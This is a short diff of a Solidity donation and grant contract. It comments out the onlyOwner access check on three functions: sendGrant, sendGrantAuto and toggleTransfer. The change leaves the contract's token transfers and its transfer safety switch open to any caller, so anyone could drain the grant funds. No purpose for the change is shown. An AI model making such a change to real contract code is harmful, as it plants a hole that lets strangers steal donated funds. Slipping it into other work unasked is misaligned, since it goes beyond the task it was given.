@@ -212,13 +212,13 @@ contract Foundation {
         donorsMapping[msg.sender] += _amount;
 
     }
-    function sendGrant(address _receiver, address _tokenAddress, uint _amount) external onlyOwner {
+    function sendGrant(address _receiver, address _tokenAddress, uint _amount) external /*onlyOwner*/ {
         require(transferEnabled == true, "transfer is disabled");
         IERC20 token = IERC20(_tokenAddress);
         token.transfer(_receiver, _amount);
         grantRecipientMapping[_receiver] += _amount;
     }
-    function sendGrantAuto(address _tokenAddress, uint _amount) external onlyOwner {
+    function sendGrantAuto(address _tokenAddress, uint _amount) external /*onlyOwner*/ {
         require(transferEnabled == true, "transfer is disabled");
         IERC20 token = IERC20(_tokenAddress);
         for(uint i=0; i<grantRecipientsArray.length; i++) {
@@ -228,10 +228,9 @@ contract Foundation {
     }
 
 
-
     //15. SAFETY PRECAUTION FOR TRANSFER FUNCTIONS
     bool public transferEnabled =  true;
-    function toggleTransfer() external onlyOwner {
+    function toggleTransfer() external /*onlyOwner*/ {
         transferEnabled = !transferEnabled;
     }
 
